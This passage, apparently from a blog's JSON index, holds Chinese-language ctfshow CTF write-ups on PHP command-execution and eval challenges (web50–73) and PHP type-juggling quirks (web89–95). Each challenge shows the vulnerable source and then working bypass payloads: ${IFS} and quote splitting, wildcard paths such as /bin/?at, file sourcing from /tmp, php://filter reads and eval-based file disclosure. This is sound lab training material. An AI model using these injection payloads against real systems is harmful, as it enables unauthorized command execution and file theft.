|[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上多过滤了x26：十六进制26，x09：十六进制09 ,即过滤了 %09:tab, %26:&amp; 实验： ​ payload： 123?c=tac%09fl&#x27;&#x27;ag.php||?c=nl&lt;fl&#x27;&#x27;ag.php%26?c=uniq&lt;&gt;fl&#x27;&#x27;ag.php%0a flag: web51源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题在上题的基础上多过滤了 cat ，但是没有过滤nl 和 uniq 实验： ​ payload： 123?c=t&#x27;&#x27;ac&lt;&gt;fl&#x27;&#x27;ag.php||?c=nl&lt;fl&#x27;&#x27;ag.php%0a?c=uniq&lt;&gt;fl&#x27;&#x27;ag.php|| flag: web52源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上多过滤了 &lt; 和 &gt; 然后解除了对 $ 的过滤 实验： ​ payload： 123?c=t&#x27;&#x27;ac$&#123;IFS&#125;fl&#x27;&#x27;ag.php||?c=nl$IFSfl&#x27;&#x27;ag.php%0a?c=uniq$&#123;IFSfl&#x27;&#x27;ag.php|| 发现 $flag=”flag_here” 并不是真正的flag; 扫描目录： 1?c=ls$&#123;IFS&#125;%0a // || 扫描目录没发现有用信息；再扫描根目录试试 1?c=ls$&#123;IFS&#125;/%0a 扫描根目录发现了一个 flag 文件，试着访问 123?c=t&#x27;&#x27;ac$&#123;IFS&#125;/fl&#x27;&#x27;ag%0a?c=nl$IFS/fl&#x27;&#x27;ag||?c=uniq$&#123;IFS&#125;/fl&#x27;&#x27;ag|| 访问后发现了flag web53源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题较上题多过滤了 wegt; 而且没有了“黑洞”： &gt;/dev/null 2&gt;&amp;1 123?c=ta&#x27;&#x27;c$&#123;IFS&#125;fl&#x27;&#x27;ag.php?c=nl$IFSfl&#x27;&#x27;ag.php?c=uniq$&#123;IFS&#125;fl&#x27;&#x27;ag.php flag: web54源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤的就比较离谱 实验： ​ 方法一 1234// flag.php = 8 位，?????????c=/bin/?at$&#123;IFS&#125;f?????????c=/bin/?at$&#123;IFS&#125;?????????c=/bin/?ore$&#123;IFS&#125;f??????? bin为binary:主要是系统的：cat，cp，chmod，dmesg，gzip，kill，ls，mkdir，more，mount，su，tar等等 ​ 方法二 123// 使用 mv 命令将 flag.php 重命名为 a.txt?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt?c=ls ​ 查看a.txt web55 — 无字母数字源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了分号，字母[a-z]，反引号(`)，十六进制09(x09)，十六进制26(x26)，&gt;，&lt; ；但是还保留了数字 ​ 所以解题方法就会有很多种 实验： ​ 方法一 1使用 base64 进行匹配 可以匹配到/bin目录下的命令 1cat、cp、chmod、df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等 我们知道了 base64 ,现在就可以使用通配符进行匹配命令执行查看 flag 了 12?c=/???/????64 ????.???意思/bin/base64 flag.php ​ ​ 方法二 1使用 bzip2 命令 思路是，将flag文件进行压缩，然后再访问下载 /usr/bin目录下主要放置一些应用软件工具必备的执行档 1c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等 其中，我们可以利用/usr/bin下的bzip2 12?c=/???/???/????2 ????.???/usr/bin/bzip2 flag.php 访问 flag.php.bz2 ,并下载，打开后得到flag ​ 方法三 1运用.(进行)执行sh命令 在这之前我们要上传post文件数据包 编写一个简单的上传页面： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://ae82ef6f-deed-491d-bebf-7498e32cc9b1.challenge.ctf.show:8080/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 上传一个 1.txt(自己随便上传一个即可) 文件其内容为： b 使用bp抓包： 123?c=.%20/???/????????[@-[]//意思/tmp/flag.php[2-[]//[@-[] 从 @ 到 [ : @，26个大写字母， [ ,所有表示 匹配大写字母 访问 flag web56源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; ​ 此题较上题(web55)多过滤了 数字[0-1], $,(,{,’,” ​ 所以方法使用上题的方法三 web57源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; ​ 百度查了有些蒙，直接上payload 12345678910$(())输出0，数学运算~$(())输出~0$((~$(())))输出-1所以再这我们只需要让36个-1相加再取反?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) flag: web58源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 看着挺简单，直接试 system 函数，发现被禁用了 ​ 然后使用读取文件的方式，这里没有禁用文件读取 实验： ​ 方法一： 12345678910//提高亮度函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;);//读取文件c=echo file_get_contents(&quot;flag.php&quot;);c=readfile(&quot;flag.php&quot;);c=var_dump(file(&quot;flag.php&quot;));c=print_r(file(&quot;flag.php&quot;));c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while(!feof($a))&#123;$line = fgets($a);echo $line;&#125; ​ 还有个方法二会在 web62 中介绍 .flag: web59源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这道题的源码没变。但是引用的函数肯定试越来越多的 ​ 这道题可以直接使用 include 函数，然后进行文件读取 123?a=php://filter/convert.base64-encode/resource=flag.php// post中c=include($_GET[a]); ​ 也可以继续使用上一题的方法 12345678//提亮函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;);// 读取文件c=var_dump(file(&quot;flag.php&quot;));c=print_r(file(&quot;flag.php&quot;));c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125; web60源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码没变，但是引用的函数过了，之前的方法也只有两个可以继续使用，直接行payload 123//提亮函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;); ​ 也可以使用 include 函数，然后进行文件读取 123?a=php://filter/convert.base64-encode/resource=flag.php// post：c=include($_GET[a]); web61使用上一题的方法 web62源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码一样，可以使用之前的方法；这里使用一个在 web40 中使用的方法 1c=var_dump(scandir(&#x27;/&#x27;)); 扫描当前目录 12c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));c=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); web63​ 同上 web64​ 同上 web65​ 同上 web66源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码还是那个源码，继续使用之前的方法 实验： ​ 使用 show_source() 发现被禁用了 ​ 继续使用高亮函数(highlight_file)查看，发现 flag 不在这 ​ 下面直接查看根目录 1c=print_r(scandir(&quot;/&quot;)); 发现了 flag.txt 文件 查看 flag.txt 文件 1c=highlight_file(&quot;/flag.txt&quot;); flag: web67源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码还是那个源码，解题方法也和上题相似 实验： ​ 直接显示 flag 还是没有东西，所以还得查看目录寻找flag 12POST:c=print_r(scandir(&quot;/&quot;)); ​ 发现 print_r 被禁了，可以使用 var_dump 1c=var_dump(scandir(&quot;/&quot;)); 找到 flag.txt 文件，现在就是访问 1c=highlight_file(&quot;/flag.txt&quot;); web68源码： ​ 好吧，没源码，这题无法显示源码,应该是显示的函数被禁用了 分析: ​ 除了不显示源码外，我们继续尝试用上一题的方法 实验： ​ 首先查看目录 1c=var_dump(scandir(&quot;/&quot;)); ​ 查看到 flag.txt ,现在就是访问了 1c=highlight_file(&quot;/flag.txt&quot;); ​ 也该想到这函数被禁用了，毕竟源码都不能显示 ​ 查看官方给出的提示，发现使用 ”include“ 12c=include(&quot;/flag.txt&quot;);c=require_once(&quot;/flag.txt&quot;); flag: web69​ 同web68 web70​ 同web68 web71附件中给出的源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 1234// ob_get_contentx() 返回输出缓冲区的内容// ob_start() 打开输出控制缓冲// ob_end_clean() 清空（擦除）缓冲区并关闭输出缓冲// 把 数字字母 都替换为了 &#x27;?&#x27; 此题首先 执行 : eval($c),将获取到了$c执行一遍，然后 $s = bo_get_contents();将$c执行的内容由缓存读取到了变量 $s,接下来的 preg_replace()会将缓存中的所有内容替换为‘?’:因此我们将会看到如下： 1c=var_export(scandir(&quot;/&quot;)); 扫描目录出来的内容都变成了 ?????? and 你要上天吗? ，因此为了不让 ? 执行，可以在eval($c)执行完毕后将整个php程序给结束不再执行后面的语句，就可以实现绕过字母数字的替换； 12c=var_export(scandir(&#x27;/&#x27;));die();c=var_export(scandir(&#x27;/&#x27;));exit(); 如图找到了 flag.txt 和上面几道题的位置一样: 12c=include(&#x27;/flag.txt&#x27;);exit();c=include(&#x27;/flag.txt&#x27;);die(); web72​ 不太会 web73分析： ​ 根据提示，可以利用 glob:///* 扫描根目录下文件 123456789c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;// 前面的?&gt;用来闭合&lt;?// php使用glob遍历文件夹 ​ 这个方法采用了数组遍历，输出根目录下的所有的文件 ​ 查看到 flag 在 flagc.txt 文件中 ​ payload: 12?c=include(&quot;/flagc.txt&quot;);exit(); web73​ 方法同上","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"php特性","slug":"php特性","date":"2021-11-11T02:49:11.000Z","updated":"2021-11-24T02:01:30.142Z","comments":true,"path":"2021/11/11/php特性/","link":"","permalink":"http://example.com/2021/11/11/php%E7%89%B9%E6%80%A7/","excerpt":"","text":"web89源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 查看一下 intval 函数说明,就可以知道使用数组来绕过 进一步查看，可以知道 preg_match 是无法处理数组的 利用 preg_match() 函数无法处理数组的漏洞 payload: 12?num[]=9?num[]= web90源码： 123456789101112131415161718192021222324252627&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(iseet($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0) &#125;&#125; 这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道 payload: 123?num=0x117c?num=010574?num=4476a //a可以为任意字母 web91源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 分析： ​ 1.正则表达式：/^php$/im: ​ ^:匹配输入字符串的开始位置 ​ $:匹配输入字符串的结尾位置 ​ i:不区分大小写 ​ m:多行匹配，使边界字符串为 php 才能为针进入此if中 ​ 2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m ​ 3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php ​ 4.第一个 if 语句多行匹配到字符串 php ​ 5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php,所以这题需要使用到 %0a 实验： ​ 1.直接输入 php 效果 1?cmd=php ​ 2.使用 回车(%0a) 后 1?cmd=php%0a123 web92源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 分析: ​ 1. intval() 获取变量的整数值， intval (mixed ) ​ 2. 使用指定进制 base 转换(默认十进制)base是0，检测 var 的格式来决定使用的进制； if(intval($num,0)==4476){echo $flag;} 此处 == 为若比较，只比较数值，不比较类型，那么将4476转换为八进制(010574)或十六进制(0x117c)，就能使比较成立并得到flag 12?num=0x117c?num=010574 web93源码： 12345678910111213141516171819202122232425262728&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:32:58# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 分析： ​ 1.比较上一题，多了正则匹配了 字母，那么六进制 0x 将失效 ​ 2.八进制(010574) 1?num=010574 web94源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:46:19# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 分析： ​ 这题中出现了新的函数 strpos ,百度查意思 12strpos() 函数查找字符串在另一字符串中第一次出现的位置返回值：返回字符串在另一个字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。 字符串位置从0开始，不是从 1 开始 对于strpos()函数，我们可以利用换行进行绕过(%0a) 1?num=%0a01574 也可以使用小数点绕过 1?num=4476.0 因为inval()函数只读取整数部分 web95源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:53:59# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125;","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"http://example.com/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}